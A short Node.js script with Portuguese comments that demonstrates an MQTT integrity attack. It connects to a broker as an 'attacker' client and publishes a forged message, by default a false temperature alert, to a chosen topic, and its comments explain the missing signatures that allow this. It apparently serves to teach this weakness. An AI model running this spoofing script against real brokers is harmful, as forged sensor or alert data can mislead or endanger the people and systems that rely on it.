// tamper_attack.js
// Este script demonstra um ataque de integridade, no qual um agente malicioso
// publica dados falsos em um tópico legítimo. Sem mecanismos de verificação de
// integridade (como assinaturas digitais ou HMACs), qualquer cliente inscrito
// no broker pode publicar mensagens e alterar informações, já que por padrão
// as mensagens não têm selo de integridade【392895368301339†L188-L201】.
//
// Uso:
//   node tamper_attack.js [brokerUrl] [topic] [mensagem]
//   - brokerUrl: endereço do broker MQTT (padrão: mqtt://test.mosquitto.org)
//   - topic: tópico alvo (padrão: "topico/unico/dupla")
//   - mensagem: mensagem falsa a ser publicada

const mqtt = require('mqtt');
const { randomUUID } = require('crypto');

const brokerUrl = process.argv[2] || 'mqtt://test.mosquitto.org';
const topic = process.argv[3] || 'topico/unico/dupla';
const maliciousMessage = process.argv.slice(4).join(' ') || 'ALERTA: temperatura = 100°C (falso)';

// Usa clientId distinto para o atacante
const clientId = `attacker_${randomUUID()}`;
const client = mqtt.connect(brokerUrl, { clientId, clean: true });

client.on('connect', () => {
  console.log(`Publicando mensagem adulterada no tópico '${topic}'`);
  client.publish(topic, maliciousMessage, { qos: 0 }, (err) => {
    if (err) {
      console.error('Erro ao publicar mensagem adulterada:', err.message);
    } else {
      console.log(`Mensagem maliciosa publicada: ${maliciousMessage}`);
    }
    client.end();
  });
});

client.on('error', (err) => {
  console.error('Erro de conexão:', err.message);
});